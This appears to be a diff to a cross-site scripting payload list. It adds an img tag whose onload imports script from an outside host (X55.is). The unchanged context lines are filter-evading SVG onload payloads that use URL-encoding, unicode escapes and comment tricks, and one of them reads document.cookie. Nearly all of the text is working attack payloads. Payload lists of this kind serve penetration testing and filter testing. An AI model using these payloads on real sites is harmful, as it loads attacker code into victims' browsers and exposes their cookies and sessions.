@@ -1,3 +1,4 @@
+<Img Src=//X55.is OnLoad%0C=import (Src)>
 %3CSVG/ONLY=1%20ONLOAD=confirm (document.domain)%3E
 <sVG/ONLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
 <svg onload=alert&#0000000040document.cookie)>
